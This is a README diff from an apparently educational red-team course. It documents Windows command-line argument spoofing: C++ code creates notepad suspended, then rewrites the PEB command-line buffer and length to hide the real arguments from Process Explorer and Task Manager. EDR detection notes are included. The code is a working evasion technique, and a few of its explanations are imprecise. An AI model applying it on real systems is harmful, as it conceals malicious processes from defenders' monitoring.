@@ -4847,3 +4847,417 @@ compile.bat
 - Windows Internals, 7th Edition - WMI Architecture
 	
 </details>
+
+
+
+<details>
+<summary>13 - Cmdline Arguments Spoofing</summary>
+
+[02.Non-admin/06.Cmdline-spoof](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/06.Cmdline-spoof)
+
+## Overview
+
+Command line argument spoofing is a technique that hides the actual command line arguments passed to a process from security tools and system monitors. This method manipulates process memory structures to replace and conceal the true command line arguments while making the process appear to have different or no arguments.
+
+## Technical Implementation
+
+### Step 1: Understanding the Technique
+
+This technique relies on several key steps to spoof command line arguments:
+
+1. **Process Creation in Suspended State**: Launch the target process with initial bogus arguments but keep it suspended `CREATE_SUSPENDED`. In our case it's notepad.exe with bogus argument `"notepad.exe c:\\windows\\system32\\kernel32.dll"` 
+2. **PEB Manipulation**: Access and modify the Process Environment Block (PEB) of the target process
+3. **Command Line Buffer Replacement**: Overwrite the command line buffer in the target process memory
+4. **Length Field Manipulation**: Truncate the visible command line length to hide the actual arguments
+
+<img width="1827" height="912" alt="image" src="https://github.com/user-attachments/assets/0d84b4be-fc0f-4784-8c6d-ad5e1adae08f" />
+
+<img width="1830" height="636" alt="image" src="https://github.com/user-attachments/assets/6f7e801f-e888-4660-a956-ce55fd465780" />
+
+<img width="1809" height="677" alt="image" src="https://github.com/user-attachments/assets/8cb9d7e0-e241-4483-9661-3389dfc679e4" />
+
+
+### Step 2: Code Implementation
+
+#### Compile and Run the Demonstration
+
+Open **Developer Command Prompt for VS** and execute:
+
+```batch
+cd 13.CmdlineSpoofing
+compile.bat
+implant.exe
+```
+
+#### Code Walkthrough
+
+**Step 2.1: Process Creation with Bogus Arguments**
+
+```cpp
+// Start process suspended with initial bogus arguments
+STARTUPINFOA si = { 0 };
+PROCESS_INFORMATION pi = { 0 };
+BOOL success;
+
+success = CreateProcessA(
+    NULL, 
+    (LPSTR) "notepad.exe c:\\windows\\system32\\kernel32.dll",  // Bogus argument
+    NULL, 
+    NULL, 
+    FALSE, 
+    CREATE_SUSPENDED | CREATE_NEW_CONSOLE,  // Critical: CREATE_SUSPENDED
+    NULL, 
+    "C:\\Windows\\System32\\", 
+    &si, 
+    &pi
+);
+```
+
+**Key Points:**
+- `CREATE_SUSPENDED` flag prevents the process from executing immediately
+- Initial argument `kernel32.dll` is intentionally misleading
+- The bogus argument should be longer than the actual arguments we plan to use
+
+**Step 2.2: Retrieving Process Basic Information**
+
+```cpp
+// Retrieve information on PEB location in process
+PROCESS_BASIC_INFORMATION pbi;
+DWORD retLen;
+
+// Get pointer to NtQueryInformationProcess function
+NtQueryInformationProcess_t NtQueryInformationProcess_p = 
+    (NtQueryInformationProcess_t) GetProcAddress(
+        LoadLibraryA("ntdll.dll"), 
+        "NtQueryInformationProcess"
+    );
+
+// Query process basic information to get PEB location
+NtQueryInformationProcess_p(
+    pi.hProcess, 
+    ProcessBasicInformation, 
+    &pbi, 
+    sizeof(pbi), 
+    &retLen
+);
+```
+
+**What This Accomplishes:**
+- `NtQueryInformationProcess` is an undocumented but widely used Windows API
+- Returns `PROCESS_BASIC_INFORMATION` containing the PEB base address
+- The PEB contains critical process information including command line arguments
+
+**Step 2.3: Reading the Process Environment Block (PEB)**
+
+```cpp
+// Read the PEB from the target process
+PEB pebLocal;
+SIZE_T bytesRead;
+
+success = ReadProcessMemory(
+    pi.hProcess, 
+    pbi.PebBaseAddress, 
+    &pebLocal, 
+    sizeof(PEB), 
+    &bytesRead
+);
+```
+
+**PEB Structure Importance:**
+- The PEB contains the `ProcessParameters` field
+- `ProcessParameters` points to `RTL_USER_PROCESS_PARAMETERS` structure
+- This structure contains the command line buffer and length information
+
+**Step 2.4: Reading Process Parameters**
+
+```cpp
+// Grab the ProcessParameters from PEB
+RTL_USER_PROCESS_PARAMETERS parameters = { sizeof(parameters) };
+ReadProcessMemory(
+    pi.hProcess, 
+    pebLocal.ProcessParameters, 
+    &parameters, 
+    sizeof(parameters), 
+    &bytesRead
+);
+```
+
+**RTL_USER_PROCESS_PARAMETERS Structure:**
+```cpp
+typedef struct _RTL_USER_PROCESS_PARAMETERS {
+    // ... other fields
+    UNICODE_STRING CommandLine;  // Contains command line buffer and length
+    // ... other fields
+} RTL_USER_PROCESS_PARAMETERS;
+```
+
+**Step 2.5: Writing Spoofed Command Line Arguments**
+
+```cpp
+// Set the actual arguments we want to use
+WCHAR spoofedArgs[] = L"notepad.exe c:\\RTO\\boom.txt\0";
+
+success = WriteProcessMemory(
+    pi.hProcess, 
+    parameters.CommandLine.Buffer, 
+    (void *) spoofedArgs, 
+    sizeof(spoofedArgs), 
+    &bytesWritten
+);
+```
+
+**Critical Details:**
+- The spoofed arguments must be shorter than the original bogus arguments
+- `sizeof(spoofedArgs)` includes the null terminator
+- The actual file `c:\RTO\boom.txt` will be opened by Notepad
+
+**Step 2.6: Hiding Arguments from Process Monitors**
+
+```cpp
+// Update the CommandLine length to hide arguments
+DWORD newUnicodeLen = 22;  // Length of "notepad.exe" in Unicode characters
+
+success = WriteProcessMemory(
+    pi.hProcess, 
+    (char *) pebLocal.ProcessParameters + 
+        offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), 
+    (void *) &newUnicodeLen, 
+    4,  // sizeof(DWORD)
+    &bytesWritten
+);
+```
+
+**Length Calculation Explained:**
+- "notepad.exe" = 11 characters
+- Unicode uses 2 bytes per character
+- Visible length = 11 × 2 = 22 bytes
+- This makes tools think the command line ends after "notepad.exe"
+
+**Step 2.7: Resuming Process Execution**
+
+```cpp
+printf("Hitme!\n");	
+getchar();
+
+// Resume thread execution
+ResumeThread(pi.hThread);
+```
+
+## Practical Demonstration
+
+### Step 3: Running the Demonstration
+
+**Execute the implant:**
+```batch
+implant.exe
+```
+
+**Initial State Observation:**
+- Notepad starts in suspended mode with bogus arguments
+- The implant pauses at "Hitme!" waiting for user input
+- At this point, the command line spoofing has been applied but the process is still suspended
+
+**Resume Execution:**
+- Press Enter to continue
+- Notepad resumes execution with the spoofed command line
+- The implant completes and exits
+
+### Step 4: Verification with System Tools
+
+**Using Process Explorer for Analysis:**
+
+Open Process Explorer with elevated privileges:
+```batch
+c:\rto\Tools\si\procexp.exe -accepteula
+```
+
+**Process Explorer Observations:**
+- Locate the notepad.exe process in the process list
+- Right-click and select "Properties"
+- Check the "Command Line" field in the Image tab
+- **Expected Result**: Command line shows only "notepad.exe" without the file argument
+- The actual file `c:\RTO\boom.txt` is opened by Notepad despite being hidden
+
+  <img width="1538" height="819" alt="image" src="https://github.com/user-attachments/assets/065e2c5d-0443-4381-bb82-1c02938fea2a" />
+
+
+**Using Task Manager for Verification:**
+
+Open Task Manager and add Command Line column:
+1. Open Task Manager → Details tab
+2. Right-click column headers → "Select columns"
+3. Check "Command line" and click OK
+4. Locate notepad.exe in the process list
+
+   <img width="1541" height="834" alt="image" src="https://github.com/user-attachments/assets/88152c02-8e26-45b7-951d-1b11d81f11ca" />
+
+   <img width="1050" height="817" alt="image" src="https://github.com/user-attachments/assets/caf1199a-5526-46bf-866a-1399f1050e39" />
+
+**Task Manager Observations:**
+- Command line column shows truncated arguments
+- Only "notepad.exe" is visible, not the file parameter
+- The technique successfully hides the actual command line arguments
+
+<img width="1296" height="831" alt="image" src="https://github.com/user-attachments/assets/b3cbaad8-b692-4326-97c0-91e28df95138" />
+
+### Step 5: File Verification
+
+**Check the Actual Result:**
+- Notepad opens `c:\RTO\boom.txt` file despite hidden arguments
+- The file content is displayed in Notepad
+- This proves the spoofed arguments are actually being used by the process
+
+## Technical Deep Dive
+
+### Step 6: Understanding the Memory Structures
+
+**PEB Structure Overview:**
+```
+PEB (Process Environment Block)
+├── ... various fields ...
+├── ProcessParameters (pointer)
+│   └── RTL_USER_PROCESS_PARAMETERS
+│       ├── ... various fields ...
+│       ├── CommandLine (UNICODE_STRING)
+│       │   ├── Length (2 bytes)
+│       │   ├── MaximumLength (2 bytes)
+│       │   └── Buffer (pointer to actual string)
+│       └── ... other fields ...
+└── ... other fields ...
+```
+
+**UNICODE_STRING Structure:**
+```cpp
+typedef struct _UNICODE_STRING {
+    USHORT Length;           // Current length in bytes
+    USHORT MaximumLength;    // Maximum capacity in bytes
+    PWSTR  Buffer;           // Pointer to string buffer
+} UNICODE_STRING;
+```
+
+### Step 7: Why This Technique Works
+
+**Process Monitor Limitations:**
+- Most tools read the `CommandLine.Length` field to determine how much to display
+- By setting this to a smaller value, we truncate the visible output
+- The actual command line buffer still contains the full arguments
+- The operating system uses the full buffer when executing the process
+
+**Memory vs Display Disconnect:**
+```
+Actual Memory Buffer:
+"notepad.exe c:\RTO\boom.txt\0"  // Full 44+ bytes
+
+Displayed Command Line (after spoofing):
+"notepad.exe"  // Only 22 bytes shown due to modified Length field
+```
+
+## Advanced Techniques
+
+### Step 8: Enhanced Spoofing Methods
+
+**Dynamic Length Calculation:**
+```cpp
+// Calculate length dynamically based on visible portion
+WCHAR visiblePart[] = L"notepad.exe";
+DWORD newUnicodeLen = wcslen(visiblePart) * sizeof(WCHAR);
+
+// Ensure we don't exceed original buffer size
+if (newUnicodeLen <= parameters.CommandLine.MaximumLength) {
+    WriteProcessMemory(...);
+}
+```
+
+**Multiple Argument Spoofing:**
+```cpp
+// Spoof different arguments for different scenarios
+WCHAR spoofedArgs[] = L"notepad.exe C:\\Windows\\System32\\drivers\\etc\\hosts\0";
+// Appears as legitimate system file editing
+```
+
+### Step 9: Error Handling and Reliability
+
+**Comprehensive Error Checking:**
+```cpp
+// Verify all critical operations
+if (!success) {
+    DWORD error = GetLastError();
+    printf("Operation failed with error: %d\n", error);
+    
+    // Clean up and terminate suspended process
+    TerminateProcess(pi.hProcess, 0);
+    return 1;
+}
+```
+
+**Buffer Size Validation:**
+```cpp
+// Ensure spoofed arguments fit in original buffer
+if (sizeof(spoofedArgs) > parameters.CommandLine.MaximumLength) {
+    printf("Spoofed arguments too long for original buffer\n");
+    TerminateProcess(pi.hProcess, 0);
+    return 1;
+}
+```
+
+## Detection and Mitigation
+
+### How EDRs Can Detect Argument Spoofing
+
+**Behavioral Indicators:**
+- Processes created in suspended state then immediately modified
+- `WriteProcessMemory` calls targeting PEB structures
+- Mismatch between command line length and actual buffer content
+- Processes with suspicious memory modifications shortly after creation
+
+**Forensic Analysis:**
+- Memory dumping can reveal actual command line arguments
+- Comparison of PEB command line length vs buffer content
+- Monitoring of `NtQueryInformationProcess` and `WriteProcessMemory` calls
+
+### Defensive Strategies
+
+**Enhanced Process Monitoring:**
+```cpp
+// EDRs can detect PEB manipulation by:
+BOOL DetectArgumentSpoofing(HANDLE hProcess) {
+    // Read PEB and verify command line length matches buffer content
+    // Check for suspicious WriteProcessMemory patterns
+    // Monitor for CREATE_SUSPENDED flag usage followed by memory writes
+    return IsSuspiciousBehavior(hProcess);
+}
+```
+
+**Memory Integrity Checks:**
+- Regular scanning of PEB structures in running processes
+- Verification of command line length fields
+- Alerting on PEB modification attempts
+
+## Building the Project
+
+### Prerequisites
+- Visual Studio 2019 or later
+- Windows SDK
+- Appropriate headers for Windows internal structures
+
+### Compilation
+```batch
+cd 13.CmdlineSpoofing
+compile.bat
+```
+
+### Required Headers
+```cpp
+#include <Windows.h>
+#include <winternl.h>  // For PEB and process information structures
+```
+
+## References
+
+- Microsoft Docs: Process Environment Block (PEB)
+- Windows Internals, 7th Edition
+- MITRE ATT&CK: T1564 (Hide Artifacts)
+- Original research by Adam Chester
+
+
+</details>
